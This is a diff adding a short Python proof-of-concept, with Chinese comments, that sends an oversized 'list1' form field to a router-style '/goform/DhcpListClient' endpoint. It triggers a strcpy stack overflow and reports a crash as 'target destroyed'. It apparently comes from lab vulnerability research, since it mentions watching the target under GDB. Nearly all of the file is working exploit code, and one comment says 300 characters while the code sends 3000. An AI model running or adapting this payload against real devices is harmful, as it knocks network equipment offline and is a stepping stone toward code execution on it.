@@ -1,1 +1,23 @@
+import requests
 
+ip = '192.168.252.136'
+url = f'http://{ip}/goform/DhcpListClient'
+cookies = {"password": "recmji"}
+
+# Payload 构造逻辑：
+# 1. LISTLEN 设置为 1，让循环执行一次
+# 2. list1 填入超长字符串（由于代码里有 list + 1，所以开头随便填个字符，后面跟 300 个 A）
+payload = {
+    "LISTLEN": "1",
+    "page": "1",
+    "list1": "B" + "A" * 3000  # 最终 strcpy 会拷贝从 'A' 开始的 300 个字符到 256 字节的 tmpstr
+}
+
+try:
+    print(f"[*] 正在通过 {url} 验证循环内 strcpy 溢出...")
+    # 这里我们不用 pause()，直接打，看看 GDB 的反应
+    res = requests.post(url=url, cookies=cookies, data=payload, timeout=3)
+    print("[-] 没崩？返回内容:", res.text)
+except requests.exceptions.ConnectionError:
+    print("\n[+] 💥 目标已击毁！Connection Reset by Peer.")
+    print("[+] 这是典型的栈溢出崩溃。")
